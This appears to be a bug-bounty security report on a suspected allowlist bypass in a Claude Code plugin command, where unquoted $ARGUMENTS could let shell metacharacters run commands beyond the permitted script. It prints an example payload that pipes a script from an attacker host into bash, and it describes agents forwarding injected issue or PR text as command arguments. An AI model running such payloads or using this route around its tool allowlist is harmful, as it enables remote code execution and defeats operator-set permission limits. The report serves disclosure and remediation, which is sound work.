### Title
Command allowlist bypass via unquoted `$ARGUMENTS` in Bash execution block - ([File: plugins/ralph-wiggum/commands/ralph-loop.md])

### Summary
The `ralph-loop.md` command restricts Bash execution to only `${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh` via `allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]`, but the executable bash block interpolates `$ARGUMENTS` unquoted directly into the shell command line. If the allowlist check is implemented as a prefix/pattern match on the resulting command string rather than a strict argv-based invocation, embedding shell metacharacters in the command arguments (which originate from ordinary slash-command input, potentially auto-populated from untrusted repository/issue/PR text) can append or substitute arbitrary shell commands that execute outside the intended `setup-ralph-loop.sh:*` scope.

### Finding Description
The command body is:
```
```!
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
```
``` [1](#0-0) 

`$ARGUMENTS` is the raw, unquoted user-supplied text following `/ralph-loop`. Because it is not wrapped in quotes, and the whole line is executed as a shell command (not passed as a pre-split argv array to `execve`), any shell metacharacters in the argument text (`;`, `&&`, `|`, backticks, `$()`, newline) are interpreted by the shell itself. The intended security boundary here is the `allowed-tools` frontmatter restricting Bash usage to `Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)`, i.e., only invocations of that specific script should be permitted. If the allowlist enforcement matches against the literal command string (e.g., checking that it starts with the script path) rather than parsing/restricting the full shell grammar, an attacker-controlled argument such as:

```
/ralph-loop foo; curl http://attacker/x.sh | bash
```

would still satisfy a naive "starts with allowed script path" check while the shell executes the injected `curl | bash` payload as a second command, entirely outside the sandboxed script. The downstream script `setup-ralph-loop.sh` itself is not the vulnerable component (it only writes to `.claude/ralph-loop.local.md` via a heredoc with values already expanded, so no second-order injection occurs there) — the vulnerable point is purely the unquoted interpolation in the `` ```! `` execution block of `ralph-loop.md` itself.

This is reachable without any special privilege: the argument text can come from ordinary user-typed slash-command input, or from automation flows/agents that populate `$ARGUMENTS` from repository content (e.g., an issue/PR description containing an injected payload that an orchestrating agent forwards as the command argument).

### Impact Explanation
If the `allowed-tools` Bash allowlist is enforced via prefix/string matching on the assembled command line (rather than proper argv validation), this allows unauthorized command execution beyond the explicitly allowed script, directly bypassing the tool-scoping/allowlist trust boundary that `allowed-tools` is meant to provide. This matches the "approval/allowlist bypass leading to unauthorized command execution" impact class for Claude Code bounties.

### Likelihood Explanation
Exploitability depends entirely on how Claude Code's permission engine validates commands executed from `` ```! `` blocks — specifically whether it performs a strict argv-based match against `Bash(<script>:*)` or a naive string/prefix match on the final shell command. I was not able to confirm the internal implementation of this allowlist matcher within the indexed portion of this repository (the Claude Code core permission-checking source does not appear to be present/indexed here — only plugin/doc content was found). Without confirming that the matcher is naive/string-based, I cannot demonstrate that the bypass is actually effective versus merely a code-smell (unquoted variable in shell) that a proper enforcement engine would still block.

### Recommendation
Regardless of how the allowlist is enforced, `$ARGUMENTS` should be quoted (`"$ARGUMENTS"`) or the script invocation should rely solely on the script's own internal argument parsing (already argv-safe) with the outer shell line quoting user input to prevent shell metacharacter interpretation at the `` ```! `` execution layer.

### Proof of Concept
Cannot be fully constructed without access to Claude Code's actual Bash-allowlist enforcement implementation (not present in this repo's indexed content) to confirm whether it validates the full shell string or only the leading token. A verifying test would need to:
1. Register the `ralph-loop` command with `allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]`.
2. Invoke `/ralph-loop test; touch /tmp/pwned` (or a `$(...)` payload).
3. Assert that only `setup-ralph-loop.sh` executes (expected/safe) versus `/tmp/pwned` being created (bypass confirmed) — the latter would prove the vulnerability; the former would refute it.

Given I could not confirm the enforcement mechanism, this is a suspected-but-unverified finding rather than a fully substantiated vulnerability.

### Citations

**File:** plugins/ralph-wiggum/commands/ralph-loop.md (L4-14)
```markdown
allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]
hide-from-slash-command-tool: "true"
---

# Ralph Loop Command

Execute the setup script to initialize the Ralph loop:

```!
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
```
```
